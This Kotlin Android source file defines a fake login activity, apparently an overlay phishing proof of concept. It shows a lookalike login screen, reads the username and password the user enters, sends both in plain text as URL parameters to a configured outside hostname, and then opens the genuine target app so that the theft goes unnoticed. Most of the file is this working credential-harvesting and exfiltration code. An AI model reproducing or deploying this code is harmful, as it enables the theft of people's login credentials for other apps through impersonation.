package io.github.tripoloski1337

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.StrictMode
import android.text.Editable
import android.widget.EditText
import androidx.appcompat.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_main.view.*
import kotlinx.android.synthetic.main.activity_troll.*
import java.net.HttpURLConnection
import java.net.URL


class FakeLoginActivity : AppCompatActivity() {
    fun sendGet(user: String, pass: String) {

        if (Build.VERSION.SDK_INT > 9) {
            val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
            StrictMode.setThreadPolicy(policy)
        }
            val hostname = getString(R.string.hostname)
            val url = URL("$hostname/?user=$user&pass=$pass")
            with(url.openConnection() as HttpURLConnection) {
                requestMethod = "GET"  // optional default is GET

                println("\nSent 'GET' request to URL : $url; Response Code : $responseCode")

                inputStream.bufferedReader().use {
                    it.lines().forEach { line ->
//                        println(line)
                    }
                }
            }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_troll)

        startActivityWithoutAnimation(Intent(this, InoffensiveActivity::class.java))

        backToOriginal.setOnClickListener {
            startOtherApp(getString(R.string.target_package))
            val user=findViewById<EditText>(R.id.username)
//        var user = username.text.toString()
            var pass = password.text.toString()

            val userText: String = user.text.toString()
            val passText: String = pass
            sendGet(userText, passText)
            finish()
        }
    }
}
